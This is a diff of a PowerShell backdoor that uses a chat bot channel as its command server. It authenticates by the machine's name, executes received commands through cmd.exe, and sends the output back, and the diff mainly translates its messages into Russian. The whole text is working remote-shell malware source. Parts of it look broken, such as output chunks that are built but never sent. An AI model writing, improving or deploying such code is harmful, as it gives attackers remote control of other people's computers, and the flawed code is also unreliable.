@@ -1,5 +1,6 @@
 $token = "$tk"
 $chan  = "$ch"
+
 $response = ""
 $previouscmd = ""
 $authenticated = 0
@@ -12,7 +13,7 @@ function PullMsg {
         $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
         if ($msg) { $script:response = $msg.Trim() }
     } catch {
-        Write-Warning "Ошибка получения сообщений: $_"
+        Write-Warning "Ошибка при получении сообщений: $_"
     }
 }
 
@@ -36,27 +37,25 @@ function sendMsg {
             break
         } catch {
             if ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 429) {
-                Write-Warning "Rate limited, retrying in 3 seconds..."
+                Write-Warning "Rate limited, повторная отправка через 3 сек..."
                 Start-Sleep -Seconds 3
                 $retryCount++
-            }
-            elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 403) {
-                Write-Warning "Forbidden error (403), likely missing permissions."
+            } elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 403) {
+                Write-Warning "Запрещено (403) — проверь права бота"
                 break
-            }
-            else {
-                Write-Warning "Failed to send message: $_"
+            } else {
+                Write-Warning "Ошибка отправки: $_"
                 break
             }
         }
     }
 }
 
-Function Authenticate {
+function Authenticate {
     if ($response -like "$env:COMPUTERNAME") {
         $script:authenticated = 1
         $script:previouscmd = $response
-        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
+        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Сессия запущена!``  :white_check_mark:"
         sendMsg "``PS | $($PWD.Path)>``"
     } else {
         $script:authenticated = 0
@@ -64,10 +63,11 @@ Function Authenticate {
     }
 }
 
-# ================== MAIN LOOP ==================
+
+# =================== ОСНОВНОЙ ЦИКЛ ===================
 PullMsg
 $previouscmd = $response
-sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"
+sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Ожидание команд..`` :hourglass_flowing_sand:"
 
 while ($true) {
     PullMsg
@@ -77,44 +77,35 @@ while ($true) {
 
         if ($authenticated -eq 1) {
             if ($response -eq "close") {
-                sendMsg ":octagonal_sign: Session Closed."
+                sendMsg ":octagonal_sign: Сессия закрыта."
                 break
             }
             if ($response -eq "Pause") {
                 $authenticated = 0
-                sendMsg ":pause_button: Session Paused."
+                sendMsg ":pause_button: Сессия приостановлена."
                 continue
             }
 
+            # Исполняем команду через cmd.exe, гарантируем вывод
             $output = ""
             try {
-                # Сначала пытаемся выполнить как PowerShell команду
-                $output = Invoke-Expression $response 2>&1 | Out-String
+                $output = (cmd.exe /c $response 2>&1 | Out-String).Trim()
             } catch {
                 $output = "$_"
             }
 
-            # Если PowerShell вывел пусто - пробуем через cmd.exe (для всех внешних команд)
-            if ([string]::IsNullOrWhiteSpace($output)) {
-                try {
-                    $output = (cmd.exe /c $response 2>&1 | Out-String)
-                } catch {
-                    $output = "$_"
-                }
-            }
-
-            $output = $output.Trim()
             if ($output) {
                 $maxBatchSize = 1900
                 $total = $output.Length
-                for ($i=0; $i -lt $total; $i += $maxBatchSize) {
+                for ($i = 0; $i -lt $total; $i += $maxBatchSize) {
                     $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
                     sendMsg "``````"
                     Start-Sleep -Milliseconds 1000
                 }
             } else {
-                sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
+                sendMsg ":white_check_mark: ``Команда отправлена`` :white_check_mark:"
             }
+
             sendMsg "``PS | $dir>``"
         } else {
             Authenticate
